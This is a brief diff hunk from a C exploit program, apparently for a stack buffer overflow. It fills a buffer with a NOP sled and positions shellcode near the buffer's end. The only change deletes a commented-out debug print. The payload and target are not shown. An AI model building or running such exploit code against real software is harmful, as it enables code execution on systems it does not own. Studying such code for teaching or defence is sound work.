@@ -27,7 +27,6 @@ main ( int argc, char * argv[] )
 	for (i = 0; i < bsize; i++){
 		buff[i] = NOP;
 	}
-	//printf("the size of input is %d\n",strlen(buff));
 
 	ptr = buff + bsize - strlen(shellcode) - 4 ;
 	for (i=0; i<strlen(shellcode); i++){
